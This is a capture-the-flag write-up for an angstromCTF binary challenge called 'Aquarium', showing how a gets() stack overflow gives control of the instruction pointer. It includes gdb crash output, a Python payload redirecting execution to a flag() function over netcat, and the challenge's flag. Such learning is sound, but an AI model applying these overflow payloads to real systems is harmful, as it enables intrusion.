Aquarium
========
**Category**: binary  **Points**: 50

Challenge Description
------------
We were given the source code and the challenge binary. 

Within the source code we can see a gets(name) which will read in all our inputs thus overwriting the stack.

checksec
```
[*] '/root/Documents/ctf/angstromctf/binary/aquarium/aquarium'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Challenge Description
------------
In gdb-peda, run <<< $(python -c "print 'A'*160"), or we could find the offset with a cyclic pattern

```
[----------------------------------registers-----------------------------------]
RAX: 0x7fffffffde40 ('A' <repeats 27 times>)
RBX: 0x0 
RCX: 0x4141414141414141 ('AAAAAAAA')
RDX: 0x41414141 ('AAAA')
RSI: 0x7fffffffde30 ('A' <repeats 11 times>)
RDI: 0x7fffffffddf0 ('A' <repeats 11 times>)
RBP: 0x4141414141414141 ('AAAAAAAA')
RSP: 0x7fffffffde40 ('A' <repeats 27 times>)
RIP: 0x414141 ('AAA')
R8 : 0x7ffff7f99760 --> 0xfbad2887 
R9 : 0x7ffff7f9a8c0 --> 0x0 
R10: 0xfffffffffffff4e9 
R11: 0x7ffff7f59a60 --> 0xfff20cc0fff20cb0 
R12: 0x4010d0 (<_start>:	repz nop edx)
R13: 0x7fffffffdf70 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x10202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
Invalid $PC address: 0x414141
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffde40 ('A' <repeats 27 times>)
0008| 0x7fffffffde48 ('A' <repeats 19 times>)
0016| 0x7fffffffde50 ('A' <repeats 11 times>)
0024| 0x7fffffffde58 --> 0x4141414100414141 ('AAA')
0032| 0x7fffffffde60 ('A' <repeats 44 times>)
0040| 0x7fffffffde68 ('A' <repeats 36 times>)
0048| 0x7fffffffde70 ('A' <repeats 28 times>)
0056| 0x7fffffffde78 ('A' <repeats 20 times>)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
Stopped reason: SIGSEGV
0x0000000000414141 in ?? ()
gdb-peda$ 

```

We can see we've gained control of the rip.

Modify the last 3 bytes to the address of flag() (0x4011b6)

```
$ python -c "print 'A' * 158 + '\xb6\x11\x40'" | nc shell.actf.co 19305
Enter the number of fish in your fish tank: Enter the size of the fish in your fish tank: Enter the amount of water in your fish tank: Enter the width of your fish tank: Enter the length of your fish tank: Enter the height of your fish tank: Enter the name of your fish tank: actf{overflowed_more_than_just_a_fish_tank}
Segmentation fault (core dumped)

```
flag: `actf{overflowed_more_than_just_a_fish_tank}`
